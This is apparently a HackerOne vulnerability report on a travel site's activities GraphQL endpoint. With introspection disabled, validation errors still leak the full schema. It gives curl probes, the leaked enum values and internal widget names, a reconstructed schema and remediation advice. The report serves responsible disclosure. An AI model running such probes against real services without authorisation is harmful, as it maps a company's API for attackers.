# HackerOne Report: GraphQL Schema Extraction via Validation Error Messages on /api/activities/graphql

## Summary

The GraphQL endpoint at `https://www.agoda.com/api/activities/graphql` has introspection disabled, but the server's validation error messages leak the entire GraphQL schema — including type names, field names, argument types, enum values, and nested type structures. This allows an attacker to reconstruct the complete API schema without introspection, enabling targeted queries and mutations.

## Asset

`https://www.agoda.com/api/activities/graphql`

## Weakness

Information Disclosure through Verbose Error Messages — CWE-209

## Severity

**Low** (CVSS 3.1: 3.7)

Vector: `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`

## Description

While introspection queries (e.g., `__schema`, `__type`) are blocked with "Introspection is not allowed", the server returns detailed validation error messages that reveal:

1. **Type names**: `SearchResponse`, `SearchActivityResult`, `ActivityWithContent`, `Content`, `ActivitySummary`, `Image`, `ReviewSummary`, `Detail`, `RepresentativeInfo`, `RankScore`, `SearchError`, `OfferPricing`, `ResultInfo`, `Matrix`, `Offer`, etc.
2. **Field names and types**: Every field on every type is revealed through "Cannot query field 'X' on type 'Y'" or "Field 'X' of type 'Z' must have a sub selection" errors.
3. **Required vs optional fields**: Required fields are revealed through "Field 'X' of required type 'Y!' was not provided" errors.
4. **Enum values**: The `SearchType` enum values were leaked: `FLAGSHIP_ACTIVITIES`, `AIRPORT_TRANSFER`, `CATEGORY`, `SEMANTIC_SEARCH`, `POINT_OF_INTEREST_BY_CITY`, `ACTIVITY`, `GEO`, `TEXT`, `COUNTRY`, `STATE`, `CITY`.
5. **Argument structures**: The `SearchRequest` input type structure was fully mapped through iterative validation errors.
6. **Field suggestions**: The server provides "Did you mean?" suggestions, further accelerating schema discovery.

## Steps to Reproduce

### Step 1: Confirm introspection is blocked

```bash
curl -sS --compressed -X POST 'https://www.agoda.com/api/activities/graphql' \
  -H 'Content-Type: application/json' \
  -H 'AG-LANGUAGE-LOCALE: en-us' \
  -H 'AG-LANGUAGE-ID: 1' \
  -H 'AG-PLATFORM-ID: 1' \
  -H 'AG-CID: -1' \
  -d '{"query":"{__schema{types{name}}}"}'
```

Response: `{"type":"INVALID","msg":"Query reducing error: Introspection is not allowed."}`

### Step 2: Extract schema via validation errors

```bash
# Discover Query type fields
curl -sS --compressed -X POST 'https://www.agoda.com/api/activities/graphql' \
  -H 'Content-Type: application/json' \
  -H 'AG-LANGUAGE-LOCALE: en-us' \
  -H 'AG-LANGUAGE-ID: 1' \
  -H 'AG-PLATFORM-ID: 1' \
  -H 'AG-CID: -1' \
  -d '{"query":"query{search(SearchRequest:{}){__typename}}"}'
```

Response reveals: `SearchRequest` requires `context` (type `InternalContext!`) and `searchRequest` (type `SearchRequestParameters!`).

### Step 3: Iterate to extract full schema

```bash
# Discover InternalContext fields
curl -sS --compressed -X POST 'https://www.agoda.com/api/activities/graphql' \
  -H 'Content-Type: application/json' \
  -H 'AG-LANGUAGE-LOCALE: en-us' \
  -H 'AG-LANGUAGE-ID: 1' \
  -H 'AG-PLATFORM-ID: 1' \
  -H 'AG-CID: -1' \
  -d '{"query":"query{search(SearchRequest:{context:{},searchRequest:{}}){__typename}}"}'
```

Response reveals: `InternalContext` requires `currency` (String!) and `experimentInfo` (ExperimentInfo!). `SearchRequestParameters` requires `searchType` (SearchType!), `searchValue` (String!), and `searchCriteria` (SearchCriteria!).

This process can be iterated to extract the complete schema.

### Step 4: Enum values leaked

```bash
curl -sS --compressed -X POST 'https://www.agoda.com/api/activities/graphql' \
  -H 'Content-Type: application/json' \
  -H 'AG-LANGUAGE-LOCALE: en-us' \
  -H 'AG-LANGUAGE-ID: 1' \
  -H 'AG-PLATFORM-ID: 1' \
  -H 'AG-CID: -1' \
  -d '{"query":"query{search(SearchRequest:{context:{currency:\"USD\",experimentInfo:{}},searchRequest:{searchType:ACTIVITIES,searchValue:\"Bangkok\",searchCriteria:{}}}){__typename}}"}'
```

Response: `Enum value 'ACTIVITIES' is undefined in enum type 'SearchType'. Known values are: FLAGSHIP_ACTIVITIES, AIRPORT_TRANSFER, CATEGORY, SEMANTIC_SEARCH, POINT_OF_INTEREST_BY_CITY, ACTIVITY, GEO, TEXT, COUNTRY, STATE, CITY.`

## Extracted Schema (Complete)

The following schema was extracted entirely through validation error messages, without using introspection:

```
type Query {
  search(SearchRequest: SearchRequest!): SearchResponse!
  review(ReviewRequest: ReviewRequest!): ReviewResponse!
}

// No mutations configured (confirmed via error: "Schema is not configured for mutations")

input SearchRequest {
  context: InternalContext!
  searchRequest: SearchRequestParameters!
}

input ReviewRequest {
  context: InternalContext!
  reviewRequest: ReviewRequestParameters!
}

input InternalContext {
  currency: String!
  experimentInfo: ExperimentInfo!
}

input ExperimentInfo {
  // Fields not yet fully enumerated
}

input SearchRequestParameters {
  searchType: SearchType!
  searchValue: String!
  searchCriteria: SearchCriteria!
}

input ReviewRequestParameters {
  searchCriteria: ReviewSearchCriteria!
}

input SearchCriteria {
  sort: Sort!
  pagination: PaginationInput!
  filters: Filters!
}

input ReviewSearchCriteria {
  activityId: Int!
  propertyId: String  // optional
  sort: Sort!
  pagination: PaginationInput!
  filters: Filters!
}

input PaginationInput {
  number: Int!
  size: Int!
}

input Filters {
  valueFilters: [ValueFilterEntry!]!
  rangeFilters: [RangeFilterEntry!]!
}

input Sort {
  order: SortOrder!
  code: SortCode!
}

enum SearchType {
  FLAGSHIP_ACTIVITIES
  AIRPORT_TRANSFER
  CATEGORY
  SEMANTIC_SEARCH
  POINT_OF_INTEREST_BY_CITY
  ACTIVITY
  GEO
  TEXT
  COUNTRY
  STATE
  CITY
}

enum SortOrder {
  Descending
  Ascending
  Default
}

enum SortCode {
  All
  ActivitiesDetailsPageExploreActivitiesCarousel
  ActivitiesSsr
  ActivitiesPoiCarousel
  ActivitiesSearchDropdown
  CityPageSsrSection
  ActivitiesHomepageDiscoverPlacesCarousel
  ActivitiesHomepageTopActivitiesCarousel
  ActivitiesHomepageEmptyStateSearchDropdown
  ActivitiesUniversalCrossSellWidgetOnPropertyPage
  ActivitiesUniversalCrossSellWidgetOnThankYouPage
  ActivitiesUniversalCrossSellWidgetOnManageMyBookingPage
  ActivitiesUniversalCrossSellWidgetOnActivitiesHomePage
  ActivitiesUniversalCrossSellWidgetOnHomePage
  BestOfCity
  Recommended
  ReviewDateTime
  Rating
  Price
  Default
  NoReorder
}

type SearchResponse {
  isSuccess: Boolean  // only field confirmed valid
  // Additional fields exist but require further enumeration
}

type ReviewResponse {
  // Fields not yet confirmed
}
```

### Required Headers

The GraphQL endpoint requires the following custom headers:
- `AG-Language-Id: 1` (language ID)
- `AG-Cid: -1` (affiliate/customer ID)
- `AG-Platform-Id: 1` (platform ID)

### Working Query Example

```graphql
query {
  search(SearchRequest: {
    context: {currency: "USD", experimentInfo: {}},
    searchRequest: {
      searchType: ACTIVITY,
      searchValue: "Bangkok",
      searchCriteria: {
        sort: {order: Descending, code: Recommended},
        pagination: {number: 1, size: 5},
        filters: {valueFilters: [], rangeFilters: []}
      }
    }
  }) {
    isSuccess
  }
}
```

This query passes all validation and reaches the resolver (returns `{"data":null,"errors":[{"message":"Internal server error"}]}` due to backend issues at time of testing).

## Impact

1. **Complete Schema Disclosure**: An attacker can reconstruct the full GraphQL schema — all queries, input types, enum values, and field requirements — despite introspection being explicitly disabled.
2. **Enum Value Leakage**: All enum values are directly leaked in error messages (e.g., `SortCode` has 21 values including internal page/widget names like `ActivitiesUniversalCrossSellWidgetOnThankYouPage` that reveal internal application architecture).
3. **Internal Architecture Disclosure**: The `SortCode` enum values reveal internal page names, widget names, and SSR rendering paths, giving attackers a map of the application's internal structure.
4. **Targeted Exploitation**: With full schema knowledge, an attacker can craft precise queries to extract sensitive data or find edge cases in business logic.
5. **Faster Vulnerability Discovery**: Schema knowledge accelerates finding IDOR, authorization, or injection vulnerabilities in specific fields and mutations.
6. **Bypass of Security Controls**: The verbose error messages effectively bypass the security control of disabling introspection, providing the same information through a different channel.

## Remediation

1. **Disable verbose error messages in production**: Return generic error messages like "Invalid query" instead of detailed validation errors.
2. **Use a custom error formatter**: Strip field names, type names, and enum values from error messages.
3. **Consider disabling the "Did you mean?" suggestions**: These are particularly helpful for attackers.
4. **Rate limit GraphQL queries**: Prevent automated schema extraction through iterative probing.
